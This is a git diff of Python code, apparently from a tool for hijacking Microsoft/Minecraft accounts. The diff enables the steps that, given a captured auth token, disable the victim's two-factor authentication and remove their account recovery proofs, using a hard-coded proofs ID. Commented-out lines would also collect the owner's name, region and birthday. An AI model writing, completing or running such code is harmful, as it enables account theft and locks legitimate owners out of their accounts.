@@ -1,13 +1,13 @@
 # from views.utils.securityInformation import securityInformation
 # from views.utils.getAccountInfo import getAccountInfo
-# from views.utils.removeProof import removeProof
+from views.utils.removeProof import removeProof
 from views.utils.getCookies import getCookies
 from views.utils.polishHost import polishHost
 from views.utils.getProfile import getProfile
-# from views.utils.remove2FA import remove2FA
+from views.utils.remove2FA import remove2FA
 from views.utils.getMethod import getMethod
 from views.utils.getCapes import getCapes
-# from views.utils.getAMRP import getAMRP
+from views.utils.getAMRP import getAMRP
 from views.utils.getSSID import getSSID
 from views.utils.getXBL import getXBL
 from views.utils.getT import getT
@@ -116,40 +116,35 @@ def secure(msaauth: str):
         accountInfo["status"] = "Microsoft Down"
 
         return accountInfo
-    
-    else:
-        
-        print("[+] - Found T")
-        return accountInfo
 
     # Security Steps
 
-    # if T:
-    #     print("[+] - Found T")
-    #     amrp = getAMRP(T, cookies[2])
+    if T:
+        print("[+] - Found T")
+        amrp = getAMRP(T, cookies[2])
 
-    #     if amrp:
+        if amrp:
             
-    #         proofsID = "CVaPoMdMAFIqPI8qEUwE8ToVCln9BkJXDVkqlCKu3bd7IUkO4mArxDAa2uUFLSc1WRoWPAHx/UlJieOCBfrVVJ1MZypXSCrKQMD7RVCSqYD15CyzBX/xYyhHLPqqWZqc3P/0ARc9DlbR6C7L5u8ppayQwAc3byXJvMN6T8Er2z3/irB6VR57bZ7U2LgkPZlyF87qaJMfREW37sOjGNtxAup6pByaHaIn50efH9X/6REGB/Qp6o9NAIuLHZcRXsHajkB5Sg6uNpnPQ:=:2:3"
+            print("[+] - Got AMRP")
+            proofsID = "CVaPoMdMAFIqPI8qEUwE8ToVCln9BkJXDVkqlCKu3bd7IUkO4mArxDAa2uUFLSc1WRoWPAHx/UlJieOCBfrVVJ1MZypXSCrKQMD7RVCSqYD15CyzBX/xYyhHLPqqWZqc3P/0ARc9DlbR6C7L5u8ppayQwAc3byXJvMN6T8Er2z3/irB6VR57bZ7U2LgkPZlyF87qaJMfREW37sOjGNtxAup6pByaHaIn50efH9X/6REGB/Qp6o9NAIuLHZcRXsHajkB5Sg6uNpnPQ:=:2:3"
 
-    #         # Two Factor Auth
-    #         remove2FA(amrp, cookies[1], cookies[2])
-    #         print("[+] - Disabled 2FA")
+            remove2FA(amrp, cookies[1], cookies[2])
+            print("[+] - Disabled 2FA")
 
-    #         removeProof(amrp, cookies[1], cookies[2], proofsID)
-    #         print("[+] - Removed Proofs")
+            removeProof(amrp, cookies[1], cookies[2], proofsID)
+            print("[+] - Removed Proofs")
+            
+        #     accountMSInfo = getAccountInfo(amrp, cookies[2])
 
-    #         accountMSInfo = getAccountInfo(amrp, cookies[2])
+        #     accountInfo["firstName"] = accountMSInfo["firstName"]
+        #     accountInfo["lastName"] = accountMSInfo["lastName"]
+        #     accountInfo["fullName"] = accountMSInfo["fullName"]
+        #     accountInfo["region"] = accountMSInfo["region"]
+        #     accountInfo["birthday"] = accountMSInfo["birthday"]
+        #     print("[+] -  Got Account Information")
 
-    #         accountInfo["firstName"] = accountMSInfo["firstName"]
-    #         accountInfo["lastName"] = accountMSInfo["lastName"]
-    #         accountInfo["fullName"] = accountMSInfo["fullName"]
-    #         accountInfo["region"] = accountMSInfo["region"]
-    #         accountInfo["birthday"] = accountMSInfo["birthday"]
-    #         print("[+] -  Got Account Information")
-
-    #         securityParameters = securityInformation(amrp)
-    #         print("[+] - Got Security Parameters")
+        #     securityParameters = securityInformation(amrp)
+        #     print("[+] - Got Security Parameters")
 
             
 
